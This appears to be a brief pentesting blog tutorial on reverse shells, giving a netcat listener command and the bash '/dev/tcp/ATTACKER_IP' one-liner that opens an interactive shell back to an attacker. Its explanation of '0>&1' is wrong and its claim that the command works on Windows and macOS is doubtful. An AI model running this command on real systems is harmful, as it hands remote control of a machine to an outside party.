---
author: "Marcin M"
title: "Reverse Shell — Quick Guide"
date: 2025-03-29T18:29:52Z
description: "How to run a reverse shell and receive the connection successfully."
aliases: []
draft: false
categories: ["Pentesting", "Shells"]
tags: ["reverse shell", "linux", "networking", "pentest"]
ShowToc: true
TocOpen: false
searchHidden: false
editPost:
  URL: "https://github.com/Marcin13/posts/blob/master/Reverse_shell.md"
---

![Screenshot.png](http://marcinmitruk.link/img/Reverse-shell/Screenshot_1.png)

## 🔁 What is a Reverse Shell?

A reverse shell is a connection **initiated from the target back to the attacker**.  
Useful in cases where the target is behind NAT or a firewall.

---

## 📥 Step 1: Start a Listener

On your attacker machine (Kali, VPS, Oracle Cloud, etc.), open a port to receive the connection:

```bash
nc -lvnp 12345
```

```sh
    -l → listen mode

    -v → verbose

    -n → skip DNS

    -p 12345 → port to listen on
```

✅ Important:
If you're using Oracle Cloud, AWS, or any VPS, you must manually open the port (e.g., 12345) in your security rules / firewall settings.

## 📥 Step2: Run the Reverse Shell

On the target machine (Linux, Windows, macOS, etc.), run the following command:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/12345 0>&1
```

```sh
    bash -i → start an interactive shell

    >& /dev/tcp/ATTACKER_IP/12345 → redirect stdin and stdout to the attacker's IP and port

    0>&1 → redirect stderr to stdout
````

🔗 **Note:** Replace `ATTACKER_IP` with your IP address.
If everything is correct, you’ll see a connection like:

```bash
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 12345
```

Happy hacking! 🎉
